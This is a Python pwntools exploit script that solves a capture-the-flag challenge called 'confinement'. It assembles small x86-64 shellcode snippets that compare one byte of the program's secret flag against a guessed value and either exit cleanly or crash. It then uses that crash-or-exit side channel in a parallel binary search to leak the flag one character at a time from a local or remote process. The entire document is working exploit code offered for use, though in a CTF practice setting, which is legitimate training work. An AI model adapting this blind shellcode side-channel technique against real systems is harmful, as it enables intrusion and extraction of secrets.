#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from concurrent.futures import ProcessPoolExecutor, as_completed

from pwn import *

elf = context.binary = ELF("./confinement_patched", checksec=False)


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="confinement")
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}

lt = f"""
    sub r12, {elf.sym["_start"]}
    add r12, {elf.sym["FLAG"]}
    push r12
    pop rsi
    add rsi, 0x7f
    lodsb
    cmp al, 0xff
    jg crash
    mov eax, 0xe7
    syscall
crash:
"""

gt = f"""
    sub r12, {elf.sym["_start"]}
    add r12, {elf.sym["FLAG"]}
    push r12
    pop rsi
    add rsi, 0x7f
    lodsb
    cmp al, 0xff
    jl crash
    mov eax, 0xe7
    syscall
crash:
"""

eq = f"""
    sub r12, {elf.sym["_start"]}
    add r12, {elf.sym["FLAG"]}
    push r12
    pop rsi
    add rsi, 0x7f
    lodsb
    cmp al, 0xff
    jne crash
    mov eax, 0xe7
    syscall
crash:
"""


def gen_compare():
    global lt_bin
    global gt_bin
    global eq_bin

    if os.path.isfile("lt.bin"):
        with open("lt.bin", "rb") as f:
            lt_bin = f.read()
    else:
        lt_bin = asm(lt, arch="amd64", os="linux")
        with open("lt.bin", "wb") as f:
            f.write(lt_bin)

    if os.path.isfile("gt.bin"):
        with open("gt.bin", "rb") as f:
            gt_bin = f.read()
    else:
        gt_bin = asm(gt, arch="amd64", os="linux")
        with open("gt.bin", "wb") as f:
            f.write(gt_bin)

    if os.path.isfile("eq.bin"):
        with open("eq.bin", "rb") as f:
            eq_bin = f.read()
    else:
        eq_bin = asm(eq, arch="amd64", os="linux")
        with open("eq.bin", "wb") as f:
            f.write(eq_bin)


lt_bin = None
gt_bin = None
eq_bin = None

gen_compare()

lt_bin = bytearray(lt_bin)
gt_bin = bytearray(gt_bin)
eq_bin = bytearray(eq_bin)

flag_offset = lt_bin.index(b"\x48\x83\xC6\x7F") + 3
val_offset = lt_bin.index(b"\x3C\xFF") + 1


def do_cmp(cmp_bin, flag_idx, mid):
    cmp_bin[val_offset] = mid
    cmp_bin[flag_offset] = flag_idx

    with context.quiet:
        io = start()
    io.send(cmp_bin)
    resp = io.recvline()
    with context.quiet:
        io.close()

    if b"adios" in resp:
        return True
    else:
        return False


def binary_search(flag_idx):
    global flag_len
    if flag_idx > flag_len:
        return (flag_idx, -1)
    low = 0x20
    high = 0x7e
    mid = 0
    while low <= high:
        mid = (high + low) // 2
        if do_cmp(eq_bin, flag_idx, mid):
            return (flag_idx, mid)
        elif do_cmp(lt_bin, flag_idx, mid):
            # print(f"flag char less than {chr(mid)}")
            high = mid - 1
        elif do_cmp(gt_bin, flag_idx, mid):
            # print(f"flag char greater than {chr(mid)}")
            low = mid + 1
    return (flag_idx, -1)


# flag = ""
# with log.progress("enumerating...") as prg:
#     for i in range(64):
#         out = binary_search(i)
#         if out == -1:
#             break
#         flag += chr(out)
#         prg.status(flag)
# log.info(f"{flag=}")

flag_len = 100

flag = []
with ProcessPoolExecutor(max_workers=8) as exc:
    fut = [exc.submit(binary_search, i) for i in range(64)]
    for f in as_completed(fut):
        idx, c = f.result()
        if c == -1:
            flag_len = min(idx, flag_len)
        else:
            print(idx, c)
            flag.append((idx, c))

flag = sorted(flag, key=lambda x: x[0])
print(''.join(map(lambda x: chr(x[1]), flag)))
